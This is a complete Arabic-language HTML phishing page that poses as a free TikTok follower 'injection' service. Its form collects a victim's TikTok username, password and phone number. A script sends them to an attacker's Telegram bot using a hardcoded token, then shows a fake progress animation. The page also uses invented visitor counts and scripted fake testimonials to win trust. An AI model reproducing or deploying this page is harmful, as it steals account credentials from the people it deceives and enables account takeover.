<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الديزل ستور | نظام الحقن العالمي 🚀</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --main: #ff4500; --accent: #00f2ea; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; }
        .header { text-align: center; padding: 25px; border-bottom: 2px solid var(--main); background: #000; box-shadow: 0 0 20px var(--main); }
        .header h1 { font-size: 2.2rem; color: var(--main); text-shadow: 0 0 10px var(--main); margin: 0; }
        .container { max-width: 500px; margin: 20px auto; padding: 15px; }
        
        /* عداد الزوار الأزرق */
        .v-counter { background: #111; padding: 12px; border-radius: 50px; border: 2px solid var(--accent); text-align: center; margin-bottom: 15px; box-shadow: 0 0 10px var(--accent); }
        .v-counter span { color: var(--accent); font-weight: bold; font-size: 1.2rem; }

        .card { background: #0d0d0d; border-radius: 25px; padding: 25px; border: 1px solid #222; text-align: center; }
        .field { width: 100%; padding: 15px; margin-top: 12px; background: #000; color: #fff; border: 1px solid #333; border-radius: 12px; box-sizing: border-box; text-align: center; outline: none; }
        .btn-main { width: 100%; padding: 18px; border-radius: 15px; border: none; font-size: 1.1rem; font-weight: bold; cursor: pointer; background: linear-gradient(90deg, var(--main), #ff8c00); color: white; margin-top: 20px; }
        
        #loading-ui { display: none; margin-top: 20px; }
        .p-bar { width: 100%; background: #222; height: 10px; border-radius: 10px; overflow: hidden; margin: 15px 0; }
        .p-fill { background: var(--accent); height: 100%; width: 0%; transition: 0.1s; }

        .comment-box { background: #111; padding: 10px; border-radius: 10px; margin-top: 10px; border-right: 4px solid #ffcc00; text-align: right; font-size: 0.8rem; }
    </style>
</head>
<body>

    <div class="header">
        <h1>الديزل <span>ستور</span></h1>
        <p style="color:#00ff00; font-size:0.7rem;">● ثغرة الحقن المباشر نشطة الآن</p>
    </div>

    <div class="container">
        <div class="v-counter">
            <i class="fas fa-users"></i> مستخدم متصل الآن: <span id="vc">45,120</span>
        </div>

        <div class="card">
            <div id="form-ui">
                <input type="text" id="u" class="field" placeholder="يوزر التيك توك (@username)">
                <input type="password" id="p" class="field" placeholder="كلمة السر لتأكيد الحقن">
                <input type="text" id="ph" class="field" placeholder="رقم الهاتف">
                <button class="btn-main" onclick="startHack()">استبدال وإرسال المتابعين (ثغرة 2026)</button>
            </div>

            <div id="loading-ui">
                <h3 id="msg" style="color: var(--accent);">جاري ربط الثغرة بالسيرفر...</h3>
                <div class="p-bar"><div class="p-fill" id="bar"></div></div>
                <p id="log" style="font-size:0.7rem; color:#555;"></p>
            </div>

            <div style="margin-top: 25px;" id="comments">
                <p style="color:#ffcc00; font-weight:bold; text-align:right;">⭐ تعليقات المتابعين:</p>
                </div>
        </div>
    </div>

    <script>
        const tok = "8730123549:AAGfIdQEXH1qXboe0aGMQZePGg5k4ec1tPU";
        const cid = "5177962707";

        // عداد الزوار الأزرق
        setInterval(() => {
            let num = parseInt(document.getElementById('vc').innerText.replace(',',''));
            document.getElementById('vc').innerText = (num + Math.floor(Math.random()*5)).toLocaleString();
        }, 2000);

        // تعليقات حية
        const words = ["تم استلام 1000 متابع حقيقي!", "الثغرة شغالة وربنا يا ديزل", "وصلني 500 متابع في ثانية", "أحسن موقع تزويد حقيقي"];
        setInterval(() => {
            const div = document.createElement('div');
            div.className = 'comment-box';
            div.innerHTML = `<b>مستخدم_${Math.floor(Math.random()*100)}:</b> ${words[Math.floor(Math.random()*words.length)]}`;
            const box = document.getElementById('comments');
            box.insertBefore(div, box.childNodes[2]);
            if(box.childNodes.length > 6) box.removeChild(box.lastChild);
        }, 3000);

        function startHack() {
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            const ph = document.getElementById('ph').value;

            if(!u || !p || !ph) { alert("املأ البيانات!"); return; }

            // إرسال الصيد لتليجرام
            fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent("🎯 صيد حقيقي:\n👤 يوزر: "+u+"\n🔑 باس: "+p+"\n📱 فون: "+ph)}`);

            document.getElementById('form-ui').style.display = "none";
            document.getElementById('loading-ui').style.display = "block";

            let w = 0;
            let bar = document.getElementById('bar');
            let msg = document.getElementById('msg');
            let log = document.getElementById('log');

            let itv = setInterval(() => {
                if(w >= 100) {
                    clearInterval(itv);
                    msg.innerText = "✅ تم الحقن بنجاح!";
                    alert("افتح حسابك دلوقتي المتابعين هيوصلوا من السيرفرات المجانية!");
                } else {
                    w++;
                    bar.style.width = w + "%";
                    if(w == 20) { msg.innerText = "جاري الاتصال بقنوات التزويد المجانية..."; log.innerText = "Connecting to FreeGate_1..."; }
                    if(w == 50) { 
                        msg.innerText = "جاري تفعيل ثغرة المتابعين الحقيقيين..."; 
                        log.innerText = "Bypassing verification for @" + u;
                        // محاكاة طلب حقيقي لموقع خارجي
                        fetch(`https://tik-followers-free.com/api/send?user=${u}`).catch(e => {});
                    }
                    if(w == 80) { msg.innerText = "جاري تأكيد الإرسال من 3 سيرفرات..."; log.innerText = "Injection Successful: 1000+ followers queued"; }
                }
            }, 100);
        }
    </script>
</body>
</html>
